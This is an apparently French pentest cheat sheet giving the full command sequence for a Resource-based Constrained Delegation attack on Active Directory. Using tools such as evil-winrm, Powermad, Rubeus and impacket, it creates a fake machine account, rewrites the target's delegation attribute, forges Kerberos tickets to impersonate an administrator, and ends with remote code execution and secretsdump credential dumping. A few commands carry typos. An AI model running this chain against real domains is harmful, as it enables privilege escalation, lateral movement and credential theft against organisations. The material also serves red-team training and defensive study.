# Resource-based Constrained Delegation

_**Note :** Cette attaque est possible si un utilisateur dispose des droits "GenericAll" sur un objet ordinateur._

_**Objectif :** Devenir administrateur de l'objet ordinateur (\<MACHINE-CIBLE>)._

#### Connexion à une machine du domaine

<pre><code><strong>$ evil-winrm -u "" -p '' -i -s /home/kali/tools/Conditionsme code
</strong>#>PowerView.ps1
#>Powermad.ps1
#>upload Rubeus.exe</code></pre>

#### Conditions

```
#>Get-DomainObject -Identity "dc=domain,dc=com" -Domain domain.com -> Suppérieur à 0
#>Get-DomainController -> Suppérieur ou égale à 2012
#>Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity -> Vide
```

#### Réalisation de l'attaque

```
#### Création d'une fausse machine sur le domaine
#>New-MachineAccount -MachineAccount <FAKE-MACHINE> -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
#>Get-DomainComputer <FAKE-MACHINE> -> Récupération du SID

#### Indiquer à <MACHINE-CIBLE> qu'elle doit faire confiance au compte <FAKE-MACHINE>
#>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID-FAKE-MACHINE>)"
#>$SDBytes = New-Object byte[] ($SD.BinaryLength)
#>$SD.GetBinaryForm($SDBytes, 0)
#>Get-DomainComputer <MACHINE-CIBLE> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### Génération des tickets Kerberos et RCE

Windows :&#x20;

```
#>./Rubeus.exe hash /password:123456 /user:<FAKE-MACHINE> /domain:<DOMAINE>
#>./Rubeus.exe s4u /user:<FAKE-MACHINE> /rc4:<RC4-PASSWORD> /impersonateuser:<ADMIN-MACHINE-CIBLE> /msdsspn:cifs/<MACHINE-CIBLE>.<DOMAINE> /domain:<DOMAINE> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
```

Linux :&#x20;

```
$ impacekt-getST -spn "cifs/<MACHINE-CIBLE>.<DOMAINE>" -impersonate <ADMIN-MACHINE-CIBLE> -dc-ip <IP-DC> '<DOMAINE>/<FAKE-MACHINE>$:123456'
$ export KRB5CCNAME=<ADMIN-MACHINE-CIBLE>.ccache
$ klist
$ impacket-psexec -k ['<DOMAINE>/<USER>@]<MACHINE-CIBLE>.<DOMAINE> or impacket-secretsdump -k <MACHINE-CIBLE>.<DOMAINE>
```
